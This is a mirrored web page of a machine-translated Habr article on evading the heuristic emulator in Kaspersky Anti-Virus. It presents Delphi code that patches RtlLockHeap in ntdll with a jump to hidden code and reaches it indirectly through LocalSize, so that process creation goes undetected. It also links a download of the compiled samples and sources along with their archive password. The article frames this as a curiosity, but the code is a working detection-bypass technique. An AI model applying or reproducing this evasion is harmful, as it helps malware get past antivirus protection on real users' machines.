<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Emulator vulnerability in Kaspersky Anti-Virus</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="At the moment, an increasing number of viruses are being created in the world, the number of which is impossible to catch. Therefore, modern technolog...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Emulator vulnerability in Kaspersky Anti-Virus</h1><div class="post__text post__text-html js-mediator-article">  At the moment, an increasing number of viruses are being created in the world, the number of which is impossible to catch.  Therefore, modern technologies of "cloud networks" and heuristic code analyzers are designed to provide protection against completely new threats before analysts add samples to the anti-virus database. <br><br>  It's no secret that in every system there will always be a pair of holes, which sooner or later will swim out.  Sometimes this is due to the mistakes of programmers, sometimes - due to the development of technology, virmaykerstva.  In this article I will show you one of the ways to bypass the emulator in the latest versions of Kaspersky Anti-Virus. <br><a name="habracut"></a><br><h4>  Theory </h4><br>  What exactly is an emulator in an antivirus and why is it needed?  The answer is very simple - almost all malware is encrypted and paked by various cryptors and protectors, while checking a file on the disk, the emulator ‚Äúspins up‚Äù the tested executive file on its virtual machine and gradually ‚Äúgets‚Äù to the necessary code, which is already detected by signature, or heuristic method. <br><br>  During the development of one of my programs, I ran into the problem that Kaspersky Anti-Virus constantly cursed at my executable, as in " <i>HEUR: Trojan.Win32.Generic</i> ", although I did not see anything harmful in it.  By the method of exceptions it was revealed that the antivirus swears at the creation of a process by the function CreateProcess (...), if its parameters set the flag of the hidden process launch.  There was nowhere to go away from this, so I had to go through various versions of the code execution, especially since I myself was interested.  The result did not take long to wait - in a couple of hours three ways to counter the emulator were found, let's consider, in my opinion, the most interesting of them, which lies in the vulnerability of the api function checks. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The emulator checks only the win api calls that the application under test makes, but whether it analyzes other api that calls the test, as it turned out, no.  Whether this was done in order to optimize or a simple oversight of the developers - no one will know. <br><br>  For clarity, I present a small scheme: on the left is shown the execution of the program in a real environment, and on the right - the execution of checks on the code in the antivirus emulator environment. <br><img src="http://img84.imageshack.us/img84/2342/kasperemu.png" alt="image"><br><br><h4>  Practice </h4><br>  As an example, I cite a part of the code that was detected in my program.  As mentioned earlier, the code does not do anything wrong, it only starts the process in a stopped state.  Written in delphi. <br><br> <code>procedure ProcessBadCode(); <br> var <br> StartInfo : TStartupInfoA; <br> ProcInfo : TProcessInformation; <br> begin <br> ZeroMemory(@StartInfo, SizeOf(TStartupInfoA)); <br> StartInfo.cb := SizeOf(TStartupInfoA); <br> CreateProcessA(nil, 'svchost.exe', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo); <br> end; <br> <br> begin <br> ProcessBadCode(); <br> end.</code> <br> <br>  All that is needed for unnoticeable execution of the code under the emulator's nose is to make a hook to any api and translate the execution to code that should go unnoticed, and then find another api that calls the first one and call it in its code.  In the following example, I took the following functions: " <i>RtlLockHeap (...)</i> " from " <i>ntdll.dll</i> " and " <i>LocalSize (...)</i> " from " <i>kernel32.dll</i> ".  As many have already understood, the second causes the first.  After the hook is set to " <i>RtlLockHeap (...)</i> ", the call chain is as follows: <br>  <i>MyCode (...)</i> -&gt; <i>LocalSize (...)</i> -&gt; <i>RtlLockHeap (...)</i> -&gt; <i>BadCode (...)</i> . <br>  Detect antivirus will not be. <br><br> <code>var <br> Initialized : Boolean; <br> procedure ProcessBadCode(); <br> var <br> StartInfo : TStartupInfoA; <br> ProcInfo : TProcessInformation; <br> begin <br> if not Initialized then //      ,     -  <br> begin <br> Initialized := True; //   ,     <br> ZeroMemory(@StartInfo, SizeOf(TStartupInfoA)); <br> StartInfo.cb := SizeOf(TStartupInfoA); <br> CreateProcessA(nil, 'svchost.exe', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo); <br> Sleep(5000); //      <br> TerminateProcess(ProcInfo.hProcess, 0); <br> ExitProcess(0); //   <br> end; <br> Sleep(INFINITE); //         <br> end; <br> <br> procedure ProcessStartCode(); <br> procedure WriteJmp(AddressFrom, AddressTo : Integer); //  jmp    <br> var <br> Protect, Stuff : Cardinal; <br> begin <br> VirtualProtect(Ptr(AddressFrom), 5, PAGE_EXECUTE_READWRITE, Protect); <br> PByte(AddressFrom)^ := $E9; <br> PInteger(AddressFrom + 1)^ := AddressTo - AddressFrom - 5; <br> VirtualProtect(Ptr(AddressFrom), 5, Protect, Stuff); <br> end; <br> var <br> NativeFunc : procedure(); <br> begin <br> //     <br> @NativeFunc := GetProcAddress(GetModuleHandle('ntdll.dll'), 'RtlLockHeap'); <br> //        BadCode <br> WriteJmp(Integer(@NativeFunc), Integer(@ProcessBadCode)); <br> //  ,    ... <br> LocalSize(0); <br> end; <br> <br> begin <br> ProcessStartCode(); <br> end.</code> <br> <br><h4>  findings </h4><br>  The golden rule: ‚Äútrust - but check!‚Äù Unfortunately, the existing policy of ‚Äútrust‚Äù to signed programs has already failed: these are examples implemented in the Stuxnet virus and in the recent exploitation of the Adobe vulnerability.  As my little experience has shown, the heuristic code analyzer of one of the most popular antiviruses is subject to the same problems.  Especially significant is the fact that the Kaspersky heuristic analyzer is <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D72ed133097cc13cebfa6c225470110b2f2c05f97fbb918bb471aa06ab6f83255-1284389331">one of the two</a> that noticed a threat in this file (for which he was honored and praised), and the detection of Chinese Jiangmin is an obvious false positive.  It is a pity that everything was decided so simply ... <br><br>  All this once again confirms the indisputable truth that not a single software product will provide adequate protection without an understanding of the security elements on the part of the operator and his active efforts to curb threats. <br><br>  In addition, a <a href="http://multi-up.com/336288">set of compiled executable files and sources</a> , which were discussed in the article.  The password for the archive is <b>elcrabe</b> . <br><br>  I express my gratitude to the user <b>gjf</b> for help in preparing the article. </div><p>Source: <a href="https://habr.com/ru/post/104206/">https://habr.com/ru/post/104206/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../104198/index.html">Why git</a></li>
<li><a href="../104199/index.html">Consumers start and lose</a></li>
<li><a href="../104202/index.html">Comments on the article CNews "Holes in Mail.RU close blackmail"</a></li>
<li><a href="../104203/index.html">Photory.me - the story in the photo</a></li>
<li><a href="../104205/index.html">Vkontakte and Master Bank presented the fraudsters on a silver platter with an excellent vulnerability to pay with bank cards</a></li>
<li><a href="../104207/index.html">Do you feel sorry for 5 cents for D'Artagnan?</a></li>
<li><a href="../104208/index.html">Natural algorithms. The implementation of the algorithm of the behavior of a swarm of bees</a></li>
<li><a href="../104209/index.html">How I did a Russian computer complex with two screens</a></li>
<li><a href="../104210/index.html">DBMS - rotate 90 degrees</a></li>
<li><a href="../104211/index.html">live camera from the International Space Station</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>